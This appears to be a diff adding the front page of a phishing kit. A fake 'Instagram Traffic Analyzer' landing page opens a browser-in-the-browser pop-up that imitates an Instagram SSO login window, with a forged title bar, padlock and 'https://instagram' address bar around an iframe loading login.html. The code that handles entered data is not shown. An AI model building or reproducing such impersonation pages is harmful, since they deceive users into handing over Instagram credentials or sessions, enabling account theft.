@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Instagram Traffic Analyzer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    <style>
+        /* ===== BASE ===== */
+        body {
+            margin: 0;
+            background: radial-gradient(circle at top, #1c1c1c, #000);
+            color: #eaeaea;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            overflow-x: hidden;
+        }
+
+        /* ===== LANDING WRAPPER ===== */
+        .landing {
+            transition: filter 0.4s ease, transform 0.4s ease;
+        }
+
+        /* ===== HERO ===== */
+        .hero {
+            text-align: center;
+            margin-top: 10vh;
+            padding: 0 16px;
+        }
+
+        .hero h1 {
+            font-size: 48px;
+            font-weight: 700;
+            background: linear-gradient(
+                90deg,
+                #feda75,
+                #fa7e1e,
+                #d62976,
+                #962fbf
+            );
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            max-width: 640px;
+            margin: 18px auto;
+            font-size: 16px;
+            opacity: 0.85;
+        }
+
+        /* ===== FEATURES ===== */
+        .features {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            margin: 70px auto 40px;
+            max-width: 960px;
+            flex-wrap: wrap;
+        }
+
+        .feature {
+            background: rgba(255, 255, 255, 0.06);
+            backdrop-filter: blur(8px);
+            padding: 26px;
+            border-radius: 16px;
+            width: 260px;
+            box-shadow: 0 10px 28px rgba(0,0,0,0.45);
+        }
+
+        /* ===== LOGIN BUTTON (DESIGN ONLY) ===== */
+        #clickme {
+            all: unset;
+            display: block;
+            margin: 52px auto 28px;
+            padding: 14px 44px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #fff;
+            cursor: pointer;
+            text-align: center;
+            border-radius: 999px;
+            background: linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);
+            box-shadow: 0 12px 34px rgba(253,29,29,.5);
+        }
+
+        /* ===== LOGIN WINDOW (CENTERED + DRAGGABLE) ===== */
+        #window {
+            position: fixed !important;
+
+            /* CENTER WITHOUT TRANSFORM (DRAG SAFE) */
+            top: calc(50vh - 300px);
+            left: calc(50vw - 400px);
+
+            z-index: 9999;
+            box-shadow: 0 40px 120px rgba(0,0,0,0.8);
+            border-radius: 10px;
+        }
+
+        /* ===== BLUR BACKGROUND WHEN LOGIN ACTIVE ===== */
+        body:has(#window[style*="display: block"]) .landing {
+            filter: blur(8px) brightness(0.6);
+            pointer-events: none;
+            user-select: none;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.55);
+            opacity: 0;
+            transition: opacity .3s ease;
+            pointer-events: none;
+            z-index: 9998;
+        }
+
+        body:has(#window[style*="display: block"])::before {
+            opacity: 1;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="landing">
+    <section class="hero">
+        <h1>Instagram Traffic Analyzer</h1>
+        <p>
+            Analyze engagement flow, profile reach, and behavioral interaction
+            patterns using authenticated Instagram session insight.
+        </p>
+    </section>
+
+    <section class="features">
+        <div class="feature">
+            <h3>Session-Based Analysis</h3>
+            <p>Traffic analytics derived directly from authenticated sessions.</p>
+        </div>
+        <div class="feature">
+            <h3>Engagement Mapping</h3>
+            <p>Identify interaction clusters and response intensity signals.</p>
+        </div>
+        <div class="feature">
+            <h3>Behavioral Insight</h3>
+            <p>Understand intent patterns through activity correlation.</p>
+        </div>
+    </section>
+
+    <!-- ORIGINAL BUTTON (UNCHANGED STRUCTURE) -->
+    <button id="clickme" style="margin-left:auto; margin-right:auto; margin-top:2.5%; text-align:center; display:block;">
+        Login with Instagram
+    </button>
+</div>
+
+<!-- ORIGINAL LOGIN WINDOW (UNCHANGED HTML) -->
+<div id="window" style="margin:auto; position: relative; bottom: 2.5%; display: none;">
+    <div id="title-bar-width">
+        <div id="title-bar">
+            <div style="margin-top:5px;">
+                <img src="./logo.svg" width="20px" height="15px" id="logo">
+                <span id="logo-description">Instagram - SSO Login Confirmation</span>
+            </div>
+            <div>
+                <span id="minimize">&#8212;</span>
+                <span id="square">□</span>
+                <span id="exit">✕</span>
+            </div>
+        </div>
+        <div id="url-bar">
+            <img src="./ssl.svg" width="20px" height="15px" id="ssl-padlock">
+            <span id="domain-name">https://instagram</span>
+            <span id="domain-path">/</span>
+        </div>
+    </div>
+
+    <iframe id="content" src="login.html" frameBorder="0"></iframe>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
